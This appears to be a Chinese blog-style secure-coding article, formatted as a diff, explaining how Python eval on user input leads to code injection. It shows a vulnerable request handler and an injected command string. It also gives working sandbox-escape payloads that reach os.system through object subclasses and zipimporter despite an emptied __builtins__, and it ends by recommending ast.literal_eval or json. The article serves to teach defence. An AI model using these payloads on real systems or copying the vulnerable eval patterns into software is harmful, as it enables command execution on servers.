@@ -1,0 +1,145 @@
+最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。
+
+下面列举一个实际产品中的例子，详情见[bug83055][1]：
+
+def remove(request, obj)：
+  query = query2dict(request.POST)
+  eval(query['oper_type'])(query, customer_obj)
+
+而query就是POST直接转换而来，是用户可直接控制的，假如用户在url参数中输入oper_type=__import__('os').system('sleep 5') 则可以执行命令sleep，当然也可以执行任意系统命令或者任意可执行代码，危害是显而易见的，那我们来看看eval到底是做什么的，以及如何做才安全？
+
+1，做什么
+
+简单来说就是执行一段表达式
+
+>>> eval('2+2')
+4
+
+>>> eval("""{'name':'xiaoming','ip':'10.10.10.10'}""")
+{'ip': '10.10.10.10', 'name': 'xiaoming'}
+
+>>> eval("__import__('os').system('uname')", {})
+Linux
+0
+
+从这三段代码来看，第一个很明显做计算用，第二个把string类型数据转换成python的数据类型，这里是dict，这也是咱们产品中常犯的错误。第三个就是坏小子会这么干，执行系统命令。
+
+eval 可接受三个参数，eval(source[, globals[, locals]]) -> value
+
+globals必须是路径，locals则必须是键值对，默认取系统globals和locals
+
+2，不正确的封装
+
+（1）下面我们来看一段咱们某个产品代码中的封装函数，见[bug][2]，或者网络上搜索排名比较高的代码，eg：
+
+def safe_eval(eval_str):
+ try:
+  #加入命名空间
+  safe_dict = {}
+  safe_dict['True'] = True
+  safe_dict['False'] = False
+  return eval(eval_str,{'__builtins__':None},safe_dict)
+ except Exception,e:
+  traceback.print_exc()
+  return ''
+
+在这里__builtins__置为空了，所以像__import__这是内置变量就没有了，这个封装函数就安全了吗？下面我一步步道来：
+
+>>> dir(__builtins__)
+
+['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError',
+
+列表项
+
+‘UnicodeEncodeError', ‘UnicodeError', ‘UnicodeTranslateError', ‘UnicodeWarning', ‘UserWarning', ‘ValueError', ‘Warning', ‘ZeroDivisionError', ‘_', ‘debug‘, ‘doc‘, ‘import‘, ‘name‘, ‘package‘, ‘abs', ‘all', ‘any', ‘apply', ‘basestring', ‘bin', ‘bool', ‘buffer', ‘bytearray', ‘bytes', ‘callable', ‘chr', ‘classmethod', ‘cmp', ‘coerce', ‘compile', ‘complex', ‘copyright', ‘credits', ‘delattr', ‘dict', ‘dir', ‘divmod', ‘enumerate', ‘eval', ‘execfile', ‘exit', ‘file', ‘filter', ‘float', ‘format', ‘frozenset', ‘getattr', ‘globals', ‘hasattr', ‘hash', ‘help', ‘hex', ‘id', ‘input', ‘int', ‘intern', ‘isinstance', ‘issubclass', ‘iter', ‘len', ‘license', ‘list', ‘locals', ‘long', ‘map', ‘max', ‘memoryview', ‘min', ‘next', ‘object', ‘oct', ‘open', ‘ord', ‘pow', ‘print', ‘property', ‘quit', ‘range', ‘raw_input', ‘reduce', ‘reload', ‘repr', ‘reversed', ‘round', ‘set', ‘setattr', ‘slice', ‘sorted', ‘staticmethod', ‘str', ‘sum', ‘super', ‘tuple', ‘type', ‘unichr', ‘unicode', ‘vars', ‘xrange', ‘zip']
+
+从__builtins__可以看到其模块中有__import__,可以借助用来执行os的一些操作。如果置为空，再去执行eval函数呢，结果如下：
+
+>>> eval("__import__('os').system('uname')", {'__builtins__':{}})
+Traceback (most recent call last):
+ File "<stdin>", line 1, in <module>
+ File "<string>", line 1, in <module>
+NameError: name '__import__' is not defined
+
+现在就是提示__import__未定义，不能成功执行了，看情况是安全了吧？答案当然是错的。
+
+比如执行如下：
+
+>>> s = """
+... (lambda fc=(
+...  lambda n: [
+...   c for c in
+...    ().__class__.__bases__[0].__subclasses__()
+...    if c.__name__ == n
+...   ][0]
+...  ):
+...  fc("function")(
+...   fc("code")(
+...    0,0,0,0,"test",(),(),(),"","",0,""
+...   ),{}
+...  )()
+... )()
+... """
+>>> eval(s, {'__builtins__':{}})
+Segmentation fault (core dumped)
+
+在这里用户定义了一段函数，这个函数调用，直接导致段错误
+
+下面这段代码则是退出解释器：
+
+>>>
+>>> s = """
+... [
+...  c for c in
+...  ().__class__.__bases__[0].__subclasses__()
+...  if c.__name__ == "Quitter"
+... ][0](0)()
+... """
+>>> eval(s,{'__builtins__':{}})
+liaoxinxi@RCM-RSAS-V6-Dev ~/tools/auto_judge $
+
+初步理解一下整个过程：
+
+>>> ().__class__.__bases__[0].__subclasses__()
+
+[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'Struct'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <class 'configobj.InterpolationEngine'>, <class 'configobj.SimpleVal'>, <class 'configobj.InterpolationEngine'>, <class 'configobj.SimpleVal'>]
+
+这句python代码的意思就是找tuple的class，再找它的基类，也就是object，再通过object找他的子类，具体的子类也如代码中的输出一样。从中可以看到了有file模块，zipimporter模块，是不是可以利用下呢？首先从file入手
+
+假如用户如果构造：
+
+>>> s1 = """
+... [
+...  c for c in
+...  ().__class__.__bases__[0].__subclasses__()
+...  if c.__name__ == "file"
+... ][0]("/etc/passwd").read()()
+... """
+>>> eval(s1,{'__builtins__':{}})
+Traceback (most recent call last):
+ File "<stdin>", line 1, in <module>
+ File "<string>", line 6, in <module>
+IOError: file() constructor not accessible in restricted mode
+
+这个restrictected mode简单理解就是python解释器的沙盒，一些功能被限制了，比如说不能修改系统，不能使用一些系统函数，如file，详情见Restricted Execution Mode，那怎么去绕过呢？这时我们就想到了zipimporter了，假如引入的模块中引用了os模块，我们就可以像如下代码来利用。
+
+>>> s2="""
+... [x for x in ().__class__.__bases__[0].__subclasses__()
+... if x.__name__ == "zipimporter"][0](
+...  "/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg").load_module(
+...  "configobj").os.system("uname")
+... """
+>>> eval(s2,{'__builtins__':{}})
+Linux
+0
+
+这就验证了刚才的safe_eval其实是不安全的。
+
+3，如何正确使用
+
+（1）使用ast.literal_eval
+
+（2）如果仅仅是将字符转为dict，可以使用json格式
+
+以上就是本文的全部内容，希望对大家的学习有所帮助，也希望大家多多支持脚本之家。
+
